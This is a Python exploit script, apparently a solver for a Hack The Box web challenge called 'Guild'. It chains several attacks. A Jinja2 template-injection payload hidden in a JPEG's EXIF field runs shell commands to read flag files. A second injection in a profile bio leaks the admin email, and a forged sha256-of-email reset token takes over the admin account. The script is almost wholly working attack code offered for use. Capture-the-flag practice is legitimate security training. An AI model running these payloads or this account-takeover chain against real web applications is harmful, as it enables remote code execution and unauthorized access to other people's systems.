#!/usr/bin/env python3
import argparse
import hashlib
import random
import re
import string
import sys
import uuid

import requests
from PIL import Image


FLAG_RE = re.compile(r"HTB\{[^\r\n}]*\}")
ADMIN_EMAIL_RE = re.compile(r"([A-Za-z0-9._%+-]+@master\.guild)")
PENDING_ROW_RE = re.compile(
    r"<tr>\s*<td>(\d+)</td>\s*<td>([^<]+)</td>\s*<td>\s*"
    r"<form action=\"/verify\" target=\"_blank\" method=\"POST\">\s*"
    r"<input type=\"hidden\" name=\"user_id\" value=\"(\d+)\">\s*"
    r"<input type=\"hidden\" name=\"verification_id\" value=\"(\d+)\">",
    flags=re.S,
)


def rand_str(n: int = 10) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def must_status(resp: requests.Response, expected: int = 200, step: str = "") -> None:
    if resp.status_code != expected:
        raise RuntimeError(f"{step}: expected HTTP {expected}, got {resp.status_code}")


def create_payload_image(path: str) -> None:
    payload = (
        "{{ self._TemplateReference__context.cycler.__init__.__globals__."
        "os.popen('cat /flag.txt /app/flag.txt 2>/dev/null').read() }}"
    )
    img = Image.new("RGB", (20, 20), (120, 40, 40))
    exif = Image.Exif()
    exif[315] = payload  # Artist
    img.save(path, format="JPEG", exif=exif)


def run(url: str, timeout: float, new_admin_password: str, verbose: bool) -> str:
    base = url.rstrip("/")
    user = f"u{uuid.uuid4().hex[:8]}"
    email = f"{user}@aa.com"
    password = "Passw0rd!"

    if verbose:
        print(f"[+] target: {base}")
        print(f"[+] user: {user}")

    user_session = requests.Session()

    must_status(
        user_session.post(
            f"{base}/signup",
            data={"email": email, "username": user, "password": password},
            timeout=timeout,
        ),
        step="signup",
    )

    must_status(
        user_session.post(
            f"{base}/login",
            data={"username": user, "password": password},
            timeout=timeout,
        ),
        step="user login",
    )

    img_path = f"/tmp/{user}_badge.jpg"
    create_payload_image(img_path)
    with open(img_path, "rb") as fp:
        must_status(
            user_session.post(
                f"{base}/verification",
                files={"file": ("badge.jpg", fp, "image/jpeg")},
                timeout=timeout,
            ),
            step="upload verification image",
        )

    leak_payload = "{{User.query.filter_by(username='admin').first().email}}"
    must_status(
        user_session.post(
            f"{base}/profile",
            data={"bio": leak_payload},
            timeout=timeout,
        ),
        step="set bio payload",
    )

    must_status(user_session.get(f"{base}/getlink", timeout=timeout), step="getlink")
    share = user_session.get(f"{base}/user/{user}", timeout=timeout)
    must_status(share, step="share profile")

    m = ADMIN_EMAIL_RE.search(share.text)
    if not m:
        raise RuntimeError("failed to leak admin email from /user/<username>")
    admin_email = m.group(1)
    if verbose:
        print(f"[+] leaked admin email: {admin_email}")

    must_status(
        user_session.post(
            f"{base}/forgetpassword",
            data={"email": admin_email},
            timeout=timeout,
        ),
        step="forgetpassword",
    )

    reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
    must_status(
        user_session.get(f"{base}/changepasswd/{reset_hash}", timeout=timeout),
        step="open reset endpoint",
    )
    must_status(
        user_session.post(
            f"{base}/changepasswd/{reset_hash}",
            data={"password": new_admin_password},
            timeout=timeout,
        ),
        step="reset admin password",
    )

    admin_session = requests.Session()
    must_status(
        admin_session.post(
            f"{base}/login",
            data={"username": "admin", "password": new_admin_password},
            timeout=timeout,
        ),
        step="admin login",
    )

    admin_page = admin_session.get(f"{base}/admin", timeout=timeout)
    must_status(admin_page, step="open admin dashboard")

    rows = PENDING_ROW_RE.findall(admin_page.text)
    if not rows:
        raise RuntimeError("no pending verification rows found in /admin")

    chosen = None
    for _, username_cell, hidden_uid, verification_id in rows:
        if username_cell.strip() == user:
            chosen = (hidden_uid, verification_id)
            break
    if chosen is None:
        # fallback to last pending row if parser matched but user row not found
        chosen = (rows[-1][2], rows[-1][3])

    if verbose:
        print(f"[+] selected verification row: user_id={chosen[0]}, verification_id={chosen[1]}")

    verify_resp = admin_session.post(
        f"{base}/verify",
        data={"user_id": chosen[0], "verification_id": chosen[1]},
        timeout=timeout,
    )
    must_status(verify_resp, step="trigger /verify")

    flag = None
    m = FLAG_RE.search(verify_resp.text)
    if m:
        flag = m.group(0)

    if not flag:
        raise RuntimeError("flag not found in /verify response")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser(description="One-shot solver for HTB Web challenge: Guild")
    parser.add_argument(
        "--url",
        default="http://154.57.164.66:31567",
        help="Base challenge URL (default: %(default)s)",
    )
    parser.add_argument("--timeout", type=float, default=15.0, help="HTTP timeout in seconds")
    parser.add_argument(
        "--new-admin-password",
        default=f"Admin-{rand_str(10)}!",
        help="Password to set for admin account during exploit",
    )
    parser.add_argument("--verbose", action="store_true", help="Print exploit progress")
    args = parser.parse_args()

    try:
        flag = run(
            url=args.url,
            timeout=args.timeout,
            new_admin_password=args.new_admin_password,
            verbose=args.verbose,
        )
    except Exception as exc:
        print(f"[-] exploit failed: {exc}")
        return 1

    print(f"[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
